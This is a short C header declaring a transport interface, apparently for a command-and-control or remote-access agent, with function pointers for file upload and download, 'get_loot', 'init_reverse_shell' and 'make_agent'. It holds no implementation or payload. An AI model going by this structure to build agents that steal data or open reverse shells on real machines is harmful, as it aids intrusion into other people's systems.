#pragma once

#include "common.h"
#include "typedefs.h"

typedef struct _transport {
    // generic protocol functions for use in the main handler
    int (*send_ok)();
    int (*send_err)();
    int (*listen)();
    int (*read)(char **buff, int length);
    int (*write)(char *buff, int length);

    int (*download_file)(char *ptr, int is_manager, char *extra);
    int (*get_loot)(char *loot);
    int (*upload_file)(char *ptr, int is_module);
    int (*get_info)(char *ptr);
    int (*init_reverse_shell)(char *id);
    int (*determine_handler)();
    
    int (*init)(pClientDat dat);
    int (*end)();

    int (*make_agent)(char *dat_ptr, char *d_ptr);
    pClientDat (*get_data)();
} transport_t, *ptransport_t;

